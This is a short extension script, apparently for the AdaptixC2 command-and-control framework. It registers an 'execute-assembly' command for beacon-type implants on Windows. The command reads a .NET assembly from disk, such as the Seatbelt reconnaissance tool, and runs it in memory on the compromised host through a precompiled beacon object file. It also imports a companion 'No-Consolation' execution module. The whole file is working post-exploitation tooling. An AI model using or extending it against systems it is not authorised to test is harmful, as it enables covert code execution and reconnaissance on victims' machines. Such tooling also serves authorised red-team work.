var metadata = {
    name: "Execution-BOF",
    description: "BOFs for inline execution"
};

ax.script_import(ax.script_dir() + "No-Consolation/no_consolation.axs")

var cmd_execute_assembly = ax.create_command("execute-assembly", "Perform in process .NET assembly execution", "execute-assembly /opt/windows/Seatbelt.exe -group=user");
cmd_execute_assembly.addArgString("path", true, "Path to .NET assembly");
cmd_execute_assembly.addArgString("params", ".NET assembly parameters", "");
cmd_execute_assembly.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let assembly_content = ax.file_read(parsed_json["path"]);
    let assembly_params  = parsed_json["params"];

    if(assembly_content.length == 0) {
        throw new Error(`file ${parsed_json["path"]} not readed`);
    }

    let bof_params = ax.bof_pack("bytes,cstr", [assembly_content, assembly_params]);
    let bof_path = ax.script_dir() + "_bin/execute-assembly." + ax.arch(id) + ".o";
    let message = "Task: execute .NET assembly " + ax.file_basename(parsed_json["path"]);

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});

var group_exec = ax.create_commands_group("Execution-BOF", [cmd_execute_assembly, cmd_no_consolation]);
ax.register_commands_group(group_exec, ["beacon", "gopher", "kharon"], ["windows"], []);
